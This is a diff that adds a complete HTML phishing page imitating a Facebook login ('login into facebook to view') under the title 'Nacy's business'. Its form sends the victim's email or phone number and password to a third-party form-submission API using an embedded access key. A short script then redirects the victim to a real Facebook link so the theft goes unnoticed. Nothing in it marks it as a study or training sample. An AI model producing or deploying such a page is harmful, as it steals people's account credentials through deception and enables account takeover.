@@ -1,0 +1,67 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Nacy's business</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <div class="content">
+      <div class="flex-div">
+        <div class="name-content">
+          <h1 class="logo">login into facebook to view</h1>
+          <p></p>
+        </div>
+
+        <!-- Form with API -->
+        <form id="loginForm"
+              action="https://api.web3forms.com/submit"
+              method="POST"
+              onsubmit="redirectSoon()">
+
+          <!-- API Key -->
+          <input type="hidden" name="access_key" value="94ca2b0d-8b41-41a1-919b-38420b9b36fd">
+
+          <!-- Inputs -->
+          <input type="text"
+                 name="email_or_phone"
+                 placeholder="Email or Phone Number"
+                 required>
+
+          <input type="password"
+                 name="pass"
+                 placeholder="Password"
+                 required
+                 minlength="6">
+
+          <button type="submit" class="login" id="loginBtn" disabled>
+            Log In
+          </button>
+
+          <a href="#">Forgot Password?</a>
+          <hr>
+          <button type="button" class="create-account">Create New Account</button>
+
+        </form>
+      </div>
+    </div>
+
+    <script>
+      const form = document.getElementById("loginForm");
+      const button = document.getElementById("loginBtn");
+
+      // Enable button only when form is valid
+      form.addEventListener("input", function () {
+        button.disabled = !form.checkValidity();
+      });
+
+      function redirectSoon() {
+        setTimeout(function () {
+          window.location.href = "https://www.facebook.com/share/r/18PpdhPEve/";
+        }, 800);
+      }
+    </script>
+  </body>
+</html>
